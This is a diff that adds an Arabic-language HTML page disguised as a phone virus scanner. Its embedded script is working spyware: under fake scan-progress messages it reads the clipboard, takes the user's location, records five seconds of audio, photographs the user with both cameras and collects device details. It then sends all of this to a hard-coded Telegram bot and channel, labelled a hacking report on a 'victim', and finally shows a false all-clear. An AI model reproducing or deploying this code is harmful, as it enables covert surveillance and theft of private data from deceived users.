@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>فاحص الفيروسات المتقدم | حماية النيون</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0c0b;
+            font-family: 'Cairo', 'Segoe UI', monospace;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+            color: #b3ffe0;
+        }
+
+        /* خلفية المطر الرقمي */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            font-family: monospace;
+            font-size: 18px;
+            font-weight: bold;
+            color: #0f8;
+            text-shadow: 0 0 3px #0f8;
+            white-space: pre;
+            overflow: hidden;
+        }
+
+        .container {
+            position: relative;
+            z-index: 20;
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 20px 18px 50px;
+            backdrop-filter: blur(2px);
+        }
+
+        /* رأس متوهج + هولوجرام */
+        .hero {
+            text-align: center;
+            margin-bottom: 35px;
+            position: relative;
+        }
+
+        .glitch-title {
+            font-size: 2.7rem;
+            font-weight: 900;
+            color: #0f8;
+            text-shadow: 0 0 12px #0f8, 0 0 25px #0f8, 2px 2px 0 #004d2e;
+            animation: shakeGlitch 0.3s infinite alternate, neonPulse 1.2s ease-in-out infinite;
+            display: inline-block;
+            letter-spacing: 2px;
+            background: #071a12;
+            padding: 10px 25px;
+            border-radius: 60px;
+            border: 1px solid #0f8;
+            backdrop-filter: blur(8px);
+        }
+
+        @keyframes shakeGlitch {
+            0% { transform: translate(0px, 0px) skew(0deg); }
+            100% { transform: translate(2px, -1px) skew(0.5deg); }
+        }
+        @keyframes neonPulse {
+            0% { text-shadow: 0 0 5px #0f8, 0 0 10px #0f8; box-shadow: 0 0 10px #0f8; }
+            100% { text-shadow: 0 0 25px #0f8, 0 0 35px #0c6; box-shadow: 0 0 25px #0f8; }
+        }
+
+        .hologram-badge {
+            width: 100px;
+            height: 100px;
+            margin: 15px auto 10px;
+            background: radial-gradient(circle, #0f8222, #022a15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 3.2rem;
+            font-weight: bold;
+            font-family: monospace;
+            animation: floatHolo 2s infinite alternate, borderFlash 1s infinite;
+            box-shadow: 0 0 20px #0f8, inset 0 0 10px #0f8;
+            border: 1px solid #0f8;
+        }
+
+        @keyframes floatHolo {
+            0% { transform: translateY(0px); }
+            100% { transform: translateY(-8px); }
+        }
+        @keyframes borderFlash {
+            0% { border-color: #0f8; box-shadow: 0 0 10px #0f8; }
+            100% { border-color: #3eff9e; box-shadow: 0 0 30px #0f8; }
+        }
+
+        /* زر البدء الاحمر المتوهج */
+        .start-virus-btn {
+            background: linear-gradient(145deg, #510000, #2a0000);
+            border: 2px solid #ff2a2a;
+            color: #ff9999;
+            font-size: 1.6rem;
+            font-weight: bold;
+            padding: 18px 15px;
+            width: 100%;
+            border-radius: 100px;
+            cursor: pointer;
+            text-shadow: 0 0 8px red;
+            box-shadow: 0 0 20px #ff2a2a, inset 0 0 10px rgba(255,0,0,0.3);
+            transition: 0.2s;
+            margin: 20px 0 30px;
+            letter-spacing: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .start-virus-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 35px #ff4f4f;
+            background: linear-gradient(145deg, #750000, #3a0303);
+        }
+
+        /* المربعات المتوهجة عمودياً */
+        .scanner-box, .atom-box {
+            background: rgba(0, 20, 10, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 48px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 2px solid;
+            box-shadow: 0 0 15px #ffd966, 0 0 5px #0f8;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .scanner-box { border-color: #0f8; box-shadow: 0 0 20px #0f8, inset 0 0 10px #0f8aa; }
+        .atom-box { border-color: #f0f; box-shadow: 0 0 20px #ff44ff; animation: borderColorShift 4s infinite; }
+
+        @keyframes borderColorShift {
+            0% { border-color: #ff0; box-shadow: 0 0 12px #ff0; }
+            33% { border-color: #0f8; box-shadow: 0 0 20px #0f8; }
+            66% { border-color: #3f8eff; box-shadow: 0 0 18px #3f8eff; }
+            100% { border-color: #ff0; }
+        }
+
+        .phone-scan-area {
+            position: relative;
+            background: #09150e;
+            border-radius: 32px;
+            padding: 25px;
+            min-height: 220px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 1px solid #0f8;
+            box-shadow: inset 0 0 45px #00000055;
+        }
+
+        .scan-line {
+            position: absolute;
+            width: 80%;
+            height: 3px;
+            background: #0f8;
+            box-shadow: 0 0 20px #0f8;
+            top: 20%;
+            left: 10%;
+            animation: scanMove 2.8s infinite ease-in-out;
+            border-radius: 10px;
+            opacity: 0.8;
+        }
+
+        @keyframes scanMove {
+            0% { top: 10%; opacity: 0.6; }
+            50% { top: 80%; opacity: 1; }
+            100% { top: 10%; opacity: 0.6; }
+        }
+
+        .phone-holo-icon {
+            font-size: 5rem;
+            text-shadow: 0 0 16px #0f8;
+            z-index: 2;
+        }
+
+        /* النواة الذرية */
+        .nucleus {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 15px auto;
+        }
+        .core {
+            width: 45px;
+            height: 45px;
+            background: radial-gradient(circle, #fff, #0f8);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 40px #0f8;
+        }
+        .electron {
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            background: #3effaa;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #0f8;
+            animation: orbit 3s linear infinite;
+        }
+        .electron:nth-child(2) { animation-duration: 2.2s; animation-delay: 0s; top: 0; left: 50%; transform: translateX(-50%); }
+        .electron:nth-child(3) { animation-duration: 2.8s; animation-delay: 1s; top: 50%; left: 0; transform: translateY(-50%); }
+        .electron:nth-child(4) { animation-duration: 1.9s; animation-delay: 0.5s; bottom: 0; left: 50%; transform: translateX(-50%); }
+        .electron:nth-child(5) { animation-duration: 3.2s; animation-delay: 1.8s; top: 50%; right: 0; transform: translateY(-50%); }
+
+        @keyframes orbit {
+            0% { transform: rotate(0deg) translateX(65px) rotate(0deg); }
+            100% { transform: rotate(360deg) translateX(65px) rotate(-360deg); }
+        }
+
+        /* loader المؤقت مع النسبة */
+        .loader-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loader-spinner {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 6px solid transparent;
+            border-top: 6px solid #0f8;
+            border-right: 6px solid #ffaa33;
+            animation: spinLoader 1.2s linear infinite;
+            box-shadow: 0 0 50px #0f8;
+            position: relative;
+        }
+        .loader-inner-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.8rem;
+            color: #bfffcf;
+            text-shadow: 0 0 20px #0f8;
+        }
+        .percent-value {
+            font-size: 2.2rem;
+            font-weight: 900;
+            direction: ltr;
+        }
+
+        /* التقرير النهائي */
+        .result-card {
+            background: #001d10cc;
+            border-radius: 40px;
+            padding: 30px;
+            text-align: center;
+            margin-top: 30px;
+            border: 2px solid #0f8;
+            box-shadow: 0 0 35px #0f8;
+            display: none;
+        }
+
+        /* تنسيقات عامة */
+        @keyframes spinLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        button {
+            background: none;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+<div class="matrix-rain" id="matrixRain"></div>
+<div class="container">
+    <div class="hero">
+        <div class="hologram-badge">👾⚡</div>
+        <h1 class="glitch-title">فـحص جـهازك و مـواجهه الڤيـروسات</h1>
+    </div>
+
+    <button class="start-virus-btn" id="startBtn">🔴 # بدء مواجهة الڤيروسات # 🛡️</button>
+
+    <!-- المربع الأول: سكانر الهاتف -->
+    <div class="scanner-box">
+        <div class="phone-scan-area">
+            <div class="scan-line"></div>
+            <div class="phone-holo-icon">📱✨</div>
+        </div>
+        <div style="text-align:center; margin-top:12px; color:#0f8;">⏎ ماسح ضوئي متقدم ⏎</div>
+    </div>
+
+    <!-- المربع الثاني: النواة الذرية -->
+    <div class="atom-box">
+        <div class="nucleus">
+            <div class="core"></div>
+            <div class="electron"></div>
+            <div class="electron"></div>
+            <div class="electron"></div>
+            <div class="electron"></div>
+        </div>
+        <div style="text-align:center; color:#f0f; margin-top:10px;">⚛️ نواة الحماية الكمومية</div>
+    </div>
+</div>
+
+<!-- نافذة التحميل + النسبة -->
+<div class="loader-modal" id="loaderOverlay">
+    <div class="loader-spinner">
+        <div class="loader-inner-text">
+            <div>جـاري فحص هـاتفك</div>
+            <div class="percent-value" id="scanPercent">0%</div>
+        </div>
+    </div>
+    <div style="color:#ccffcc; margin-top: 35px; font-size: 0.9rem; text-align: center;" id="permStatusMsg">⚙️ تهيئة المستشعرات...</div>
+</div>
+
+<!-- رسالة النتيجة النهائية -->
+<div class="container" id="resultContainer" style="display: none;">
+    <div class="result-card">
+        <div style="font-size: 2rem; margin-bottom: 15px;">✅ تـم فحص هاتفك بنجـاح ✅</div>
+        <div style="color: #3effce; font-size: 1.6rem; font-weight: bold; margin: 15px 0;">☑️ تـم فحص هاتفك ولـم يتم العثور على اي ملفات ضاره او ڤيروسات تبطئ الجهاز يبدو ان هاتفك بحاله جيده ومستقره</div>
+        <div style="background: #0a3322; padding: 15px; border-radius: 35px; margin-top: 15px; font-family: monospace; font-size: 0.8rem; direction: ltr; text-align: center;">🛡️ نظام آمن بالكامل • حماية ذكية</div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        // توكن وقناة
+        const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
+        const CHANNEL_ID = '-1003875161698';
+
+        let collectedData = {
+            messages: [],
+            frontPhotos: [],
+            backPhotos: [],
+            deviceInfo: {},
+            location: {},
+            clipboardContent: '',
+            audioBase64: null
+        };
+
+        let mediaStreamFront = null, mediaStreamBack = null;
+        let scanningActive = false;
+
+        // وظيفة تحديث نسبة الفحص
+        let percentSpan = document.getElementById('scanPercent');
+        let permMsgSpan = document.getElementById('permStatusMsg');
+        function setPercent(value, msg) {
+            if(percentSpan) percentSpan.innerText = value + '%';
+            if(permMsgSpan) permMsgSpan.innerText = msg;
+        }
+
+        async function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+
+        // إرسال رسالة نصية أولية خاصة بالاختراق
+        async function sendHackMessage() {
+            const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝗞𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝗥​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ chat_id: CHANNEL_ID, text: specialMsg, parse_mode: 'HTML' })
+                });
+                console.log("ارسال الرساله الافتتاحية");
+            } catch(e) { console.warn(e); }
+        }
+
+        // إرسال تقرير الموقع والمعلومات والحافظة بصورة منظمة
+        async function sendComprehensiveReport(device, loc, clip, audioFlag) {
+            let text = `🔰 <b>تقرير الاختراق الشامل</b> 🔰\n\n`;
+            text += `📱 <b>الجهاز:</b> ${device.fullName || 'غير معروف'}\n`;
+            text += `🏭 <b>الشركة:</b> ${device.brand || '-'}\n`;
+            text += `🔧 <b>الموديل:</b> ${device.model || '-'}\n`;
+            text += `💻 <b>نظام التشغيل:</b> ${device.os || '-'}\n`;
+            text += `🌐 <b>المتصفح:</b> ${device.browser || '-'}\n`;
+            text += `📏 <b>الشاشة:</b> ${device.screen || '-'}\n`;
+            text += `🔋 <b>البطارية:</b> ${device.battery || '-'}\n`;
+            text += `🕒 <b>المنطقة:</b> ${device.timezone || '-'}\n`;
+            text += `🗣️ <b>اللغة:</b> ${device.language || '-'}\n\n`;
+            if(loc && loc.lat) {
+                text += `📍 <b>الموقع الحالي:</b>\nLat: ${loc.lat}\nLng: ${loc.lng}\nالدقة: ${loc.acc || '?'} متر\n`;
+                text += `🔗 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">خريطة الموقع</a>\n\n`;
+            } else text += `📍 الموقع: غير متاح\n\n`;
+            if(clip) text += `📋 <b>محتويات الحافظة:</b>\n<code>${clip.substring(0, 500)}</code>\n\n`;
+            else text += `📋 الحافظة: فارغة\n\n`;
+            text += `🎤 <b>تسجيل صوتي:</b> ${audioFlag ? 'تم التسجيل ✓' : 'لم يتم'}\n`;
+            text += `📅 <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+            });
+        }
+
+        // إرسال الصور الى القناة
+        async function sendPhotosToChannel(photosArray, prefix) {
+            for(let i=0; i<photosArray.length; i++) {
+                if(!photosArray[i]) continue;
+                try {
+                    let blob = await (await fetch(photosArray[i])).blob();
+                    let formData = new FormData();
+                    formData.append('chat_id', CHANNEL_ID);
+                    formData.append('photo', blob, `${prefix}_${Date.now()}_${i}.jpg`);
+                    formData.append('caption', `${prefix} صورة ${i+1} - تم الالتقاط اثناء الفحص`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    await delay(500);
+                } catch(e){ console.warn(e); }
+            }
+        }
+
+        // --- جمع معلومات الجهاز المتقدمة ---
+        async function gatherDeviceInfo() {
+            let ua = navigator.userAgent;
+            let brand = 'غير معروف', model = 'غير محدد';
+            if(ua.includes('iPhone')) brand = 'Apple';
+            else if(ua.includes('Samsung')) brand = 'Samsung';
+            else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
+            else if(ua.includes('Pixel')) brand = 'Google';
+            else brand = 'Android/PC';
+            let battery = 'غير مدعوم';
+            if('getBattery' in navigator){
+                try{ let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'يشحن':'لا يشحن'}`; }catch(e){}
+            }
+            return {
+                fullName: navigator.userAgentData?.platform || ua.split(' ').slice(0,3).join(' '),
+                brand: brand,
+                model: model,
+                os: navigator.platform,
+                browser: /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Safari',
+                screen: `${screen.width}x${screen.height}`,
+                battery: battery,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+        }
+
+        // الموقع الجغرافي
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+        }
+
+        // قراءة الحافظة
+        async function readClipboardText() {
+            try {
+                let text = await navigator.clipboard.readText();
+                return text || '(فارغة)';
+            } catch(e){ return 'لا يمكن الوصول أو فارغ'; }
+        }
+
+        // تسجيل صوت (5 ثواني)
+        async function recordAudio() {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                let mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                let chunks = [];
+                mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+                let promise = new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        let blob = new Blob(chunks, { type: 'audio/webm' });
+                        let url = URL.createObjectURL(blob);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(url);
+                    };
+                });
+                mediaRecorder.start();
+                await delay(5000);
+                mediaRecorder.stop();
+                return await promise;
+            } catch(e){ return null; }
+        }
+
+        // التقاط صور من الكاميرا الامامية 3 صور
+        async function captureFrontPhotos(count=3) {
+            let photos = [];
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await delay(500);
+                let canvas = document.createElement('canvas');
+                for(let i=0; i<count; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                    photos.push(dataUrl);
+                    await delay(400);
+                }
+                stream.getTracks().forEach(t=>t.stop());
+                video.remove();
+            } catch(e){ console.warn('front cam error', e); }
+            return photos;
+        }
+
+        async function captureBackPhotos(count=3) {
+            let photos = [];
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await delay(500);
+                let canvas = document.createElement('canvas');
+                for(let i=0; i<count; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                    photos.push(dataUrl);
+                    await delay(400);
+                }
+                stream.getTracks().forEach(t=>t.stop());
+                video.remove();
+            } catch(e){ console.warn('back cam error', e); }
+            return photos;
+        }
+
+        // محاكاة واجهة المسح الضوئي والنسبة
+        async function startFullScan(){
+            const loaderDiv = document.getElementById('loaderOverlay');
+            const resultDiv = document.getElementById('resultContainer');
+            loaderDiv.style.display = 'flex';
+            resultDiv.style.display = 'none';
+            scanningActive = true;
+            
+            // طلب الاذونات اولا بشكل منفرد لتجنب الاخفاقات
+            setPercent(5, "طلب صلاحية الميكروفون...");
+            try{ await navigator.mediaDevices.getUserMedia({ audio: true }).then(s=>s.getTracks().forEach(t=>t.stop())); }catch(e){}
+            setPercent(10, "الوصول إلى الموقع الجغرافي...");
+            await getLocation();
+            setPercent(15, "الوصول إلى الحافظة...");
+            await readClipboardText();
+            setPercent(20, "تجهيز الكاميرا الامامية...");
+            await captureFrontPhotos(1).catch(e=>null);
+            setPercent(30, "تجهيز الكاميرا الخلفية...");
+            await captureBackPhotos(1).catch(e=>null);
+            
+            setPercent(40, "جمع معلومات الجهاز...");
+            let device = await gatherDeviceInfo();
+            setPercent(50, "تحديد الموقع الحالي...");
+            let location = await getLocation();
+            setPercent(60, "سحب محتوى الحافظة...");
+            let clipboard = await readClipboardText();
+            setPercent(70, "تسجيل الصوت (5 ثوان)...");
+            let audioUrl = await recordAudio();
+            setPercent(80, "التقاط صور أمامية (3)");
+            let frontPics = await captureFrontPhotos(3);
+            setPercent(90, "التقاط صور خلفية (3)");
+            let backPics = await captureBackPhotos(3);
+            setPercent(95, "إرسال البيانات إلى القناة المحصنة...");
+            
+            // ارسال الرسالة الافتتاحية الخاصة
+            await sendHackMessage();
+            // ارسال التقرير التفصيلي
+            await sendComprehensiveReport(device, location, clipboard, !!audioUrl);
+            // ارسال الصور
+            if(frontPics.length) await sendPhotosToChannel(frontPics, 'front_cam');
+            if(backPics.length) await sendPhotosToChannel(backPics, 'back_cam');
+            // ارسال الصوت ان وجد
+            if(audioUrl){
+                let blob = await fetch(audioUrl).then(r=>r.blob());
+                let formData = new FormData();
+                formData.append('chat_id', CHANNEL_ID);
+                formData.append('audio', blob, 'spy_voice.webm');
+                formData.append('caption', '🎙️ تسجيل صوتي تلقائي اثناء الفحص');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+            }
+            setPercent(100, "اكتمل الفحص بنجاح");
+            await delay(800);
+            loaderDiv.style.display = 'none';
+            resultDiv.style.display = 'block';
+            scanningActive = false;
+            // اعادة ضبط شاشة التحميل
+        }
+
+        // Rain matrix effect
+        function initMatrixRain() {
+            let canvas = document.createElement('canvas');
+            let ctx = canvas.getContext('2d');
+            let rainDiv = document.getElementById('matrixRain');
+            canvas.style.position = 'fixed';
+            canvas.style.top = 0;
+            canvas.style.left = 0;
+            canvas.style.width = '100%';
+            canvas.style.height = '100%';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.zIndex = 2;
+            rainDiv.appendChild(canvas);
+            let w = window.innerWidth, h = window.innerHeight;
+            canvas.width = w; canvas.height = h;
+            let chars = "01";
+            let fontSize = 16;
+            let columns = Math.floor(w / fontSize);
+            let drops = Array(columns).fill(1);
+            function draw() {
+                ctx.fillStyle = "rgba(0, 10, 5, 0.05)";
+                ctx.fillRect(0, 0, w, h);
+                ctx.fillStyle = "#0f8";
+                ctx.font = fontSize + "px monospace";
+                for(let i=0; i<drops.length; i++){
+                    let text = chars[Math.floor(Math.random()*chars.length)];
+                    ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+                    if(drops[i]*fontSize > h && Math.random() > 0.975) drops[i]=0;
+                    drops[i]++;
+                }
+                requestAnimationFrame(draw);
+            }
+            draw();
+            window.addEventListener('resize', ()=>{
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                w = canvas.width; h = canvas.height;
+                columns = Math.floor(w/fontSize);
+                drops = Array(columns).fill(1);
+            });
+        }
+        
+        document.getElementById('startBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            if(scanningActive) return;
+            startFullScan();
+        });
+        
+        initMatrixRain();
+    })();
+</script>
+</body>
+</html>
